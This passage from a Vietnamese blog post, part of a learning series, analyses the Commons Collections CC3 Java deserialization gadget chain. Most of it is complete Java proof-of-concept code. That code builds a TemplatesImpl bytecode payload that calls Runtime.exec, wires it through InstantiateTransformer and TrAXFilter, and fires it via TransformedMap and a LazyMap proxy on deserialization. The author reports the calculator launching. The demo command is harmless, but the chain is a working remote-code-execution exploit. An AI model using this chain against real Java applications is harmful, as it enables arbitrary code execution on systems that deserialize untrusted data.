+<p>Hai cái này mình đã có bài viết về nó nên mình sẽ dùng lại luôn. Nếu muốn giải thích kĩ hơn thì các bạn xem lại ở bài viêt trước nhé~</p>
+<h3 id="ChainedTransformed-TransformedMap"><a href="#ChainedTransformed-TransformedMap" class="headerlink" title="ChainedTransformed + TransformedMap"></a>ChainedTransformed + TransformedMap</h3><p>Tiếp đến ta chỉ cần thêm đoạn này để trigger <code>ChainedTransformer.transform</code>.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;Object, Object&gt; map = (TransformedMap) TransformedMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(), <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        map.put(<span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">for</span>(Map.Entry entry : map.entrySet())&#123;</span><br><span class="line">            entry.setValue(<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>POC đến giai đoạn hiện tại:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));</span><br><span class="line">        ctClass.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_nameField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _nameField.set(templates, <span class="string">&quot;notNull&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_classField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        _classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _classField.set(templates, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _bytecodes.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        Field tfactoryField=templates.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">        <span class="comment">//instantiateTransformer.transform(TrAXFilter.class);</span></span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        Map&lt;Object, Object&gt; map = (TransformedMap) TransformedMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(), <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        map.put(<span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">for</span>(Map.Entry entry : map.entrySet())&#123;</span><br><span class="line">            entry.setValue(<span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Hoàn thiện chain:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));</span><br><span class="line">        ctClass.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_nameField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _nameField.set(templates, <span class="string">&quot;notNull&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_classField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        _classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _classField.set(templates, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _bytecodes.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        Field tfactoryField=templates.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">        <span class="comment">//instantiateTransformer.transform(TrAXFilter.class);</span></span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//chainedTransformer.transform(null);</span></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;test-value&quot;</span>);</span><br><span class="line">        Map&lt;Object, Object&gt; map = (TransformedMap) TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">aihClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihClassConstructor</span> <span class="operator">=</span> aihClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        aihClassConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">aihObject</span> <span class="operator">=</span> aihClassConstructor.newInstance(Target.class, map);</span><br><span class="line">        serialize(aihObject);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Xây dựng xong chạy lên thì không thấy máy tính bật :) check đi check lại, tưởng là có vấn đề gì hóa ra jdk-1.8.0_342 mình đặt tên là 1.8.0_65 nên không chạy được :).</p>
+<p><img src="/.io//TransformedMapResult.png"></p>
+<p>Cái phần này mình chỉ lấy lại template từ bài viết trước, nếu các bạn chưa xem thì xem bài đó để hiểu nó là gì nhé~</p>
+<h3 id="ChainedTransformed-LazyMap"><a href="#ChainedTransformed-LazyMap" class="headerlink" title="ChainedTransformed + LazyMap"></a>ChainedTransformed + LazyMap</h3><p>Chain hoàn chỉnh:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));</span><br><span class="line">        ctClass.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_nameField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _nameField.set(templates, <span class="string">&quot;notNull&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_classField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        _classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _classField.set(templates, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _bytecodes.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        Field tfactoryField=templates.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">        <span class="comment">//instantiateTransformer.transform(TrAXFilter.class);</span></span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//chainedTransformer.transform(null);</span></span><br><span class="line">        <span class="comment">//----------------------TransformedMap</span></span><br><span class="line"><span class="comment">//        HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();</span></span><br><span class="line"><span class="comment">//        hashMap.put(&quot;value&quot;, &quot;test-value&quot;);</span></span><br><span class="line"><span class="comment">//        Map&lt;Object, Object&gt; map = (TransformedMap) TransformedMap.decorate(hashMap, null, chainedTransformer);</span></span><br><span class="line"><span class="comment">//        Class aihClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span></span><br><span class="line"><span class="comment">//        Constructor aihClassConstructor = aihClass.getDeclaredConstructor(Class.class, Map.class);</span></span><br><span class="line"><span class="comment">//        aihClassConstructor.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        Object aihObject = aihClassConstructor.newInstance(Target.class, map);</span></span><br><span class="line"><span class="comment">//        serialize(aihObject);</span></span><br><span class="line"><span class="comment">//        unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line">        <span class="comment">//-----------------------LazyMap</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line">        <span class="comment">//lazyMap.get(null);</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">aihClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihConstructor</span> <span class="operator">=</span> aihClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        aihConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">aihInstance</span> <span class="operator">=</span> (InvocationHandler) aihConstructor.newInstance(Override.class, lazyMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(aihClass.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,aihInstance);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">aihProxyObject</span> <span class="operator">=</span> aihConstructor.newInstance(Override.class, proxyMap);</span><br><span class="line">        serialize(aihProxyObject);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Chạy file và máy tính đã bật lên!</p>
+<p><img src="/.io//LazyMapResult.png"></p>
+<p>Phần thay đổi lấy từ cc1-lazymap, các bạn tìm lại đọc nhé~</p>
+<h2 id="Loi-ket"><a href="#Loi-ket" class="headerlink" title="Lời kết"></a>Lời kết</h2><p>Chain này cũng không có gì quá khó khăn vì dựa trên phần đầu của cc1 và phần đuôi của cc2 mà mình đã phân tích. Chỉ khác là nó không đi qua <code>InvokerTranformer</code> mà đi qua <code>InstantiateTransformer</code> kết hợp với <code>TrAXFilter</code>.<br>Qua ba bài viết về ba gadget chains mình đã dần thấy quen với việc đọc mã nguồn và sâu chuỗi các hàm, class. Mọi thứ dần trở nên dễ dàng hơn một xíu rồi. Hy vọng các bạn cũng như mình!<br>Phần này mình sử dụng lại các đoạn code từ mấy chain trước nên nếu bạn chưa hiểu thì tìm đọc nhé.</p>
+<blockquote>
+<p>Chúc các bạn học tốt~</p>
+</blockquote>
+</div>
+        </div>
+        
+        <footer class="kratos-entry-footer clearfix">
+            
+                <div class="post-like-donate text-center clearfix" id="post-like-donate">
+                
+                
+                    <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> Chia sẻ</a>
+                    <div class="share-wrap" style="display: none;">
+    <div class="share-group">
+        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-qq"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-star"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weixin"></i>
+            </div>
+            <div class="share-int">
+                <div class="qrcode" id="wechat-qr"></div>
+                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weibo"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-facebook"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-twitter"></i>
+            </div>
+        </a>
+    </div>
+    <script type="text/javascript">
+        $(()=>{
+            new QRCode("wechat-qr", {
